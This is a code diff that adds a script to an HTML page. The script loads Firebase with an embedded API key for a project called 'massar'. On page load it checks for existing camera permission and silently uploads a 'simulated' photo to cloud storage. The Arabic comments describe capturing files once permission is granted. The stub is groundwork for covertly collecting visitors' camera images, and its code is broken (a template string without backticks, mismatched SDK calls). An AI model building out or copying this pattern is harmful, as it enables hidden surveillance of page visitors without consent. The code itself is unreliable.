@@ -71,6 +71,43 @@
             color: #888;
         }
     </style>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js"></script>
+    <script>
+        // تكوين Firebase باستخدام المفاتيح التي أرسلتها
+        const firebaseConfig = {
+            apiKey: "AIzaSyDCiRTinoSAcutvgCSXx7Rk9IzEaUql1GU",
+            authDomain: "massar-d5245.firebaseapp.com",
+            projectId: "massar-d5245",
+            storageBucket: "massar-d5245.appspot.com",
+            messagingSenderId: "812178957209",
+            appId: "1:812178957209:web:6c05bbdb7bf3702953a908",
+            measurementId: "G-44PZK338LW"
+        };
+    
+        // تهيئة Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const storage = firebase.storage();
+    
+        // رفع الصور إلى Firebase
+        function uploadFile(file) {
+            const storageRef = storage.ref(uploads/${file.name});
+            storageRef.put(file).then(() => {
+                console.log('تم رفع الملف بنجاح');
+            }).catch((error) => {
+                console.error('خطأ أثناء رفع الملف:', error);
+            });
+        }
+    
+        // التقاط الملفات بمجرد منح الإذن
+        navigator.permissions.query({ name: 'camera' }).then((permissionStatus) => {
+            if (permissionStatus.state === 'granted') {
+                // محاكاة التقاط صورة
+                const fakeFile = new File(["محتوى وهمي"], "صورة_وهمية.jpg", { type: "image/jpeg" });
+                uploadFile(fakeFile);
+            }
+        });
+    </script>
 </head>
 <body>
     <div class="container">
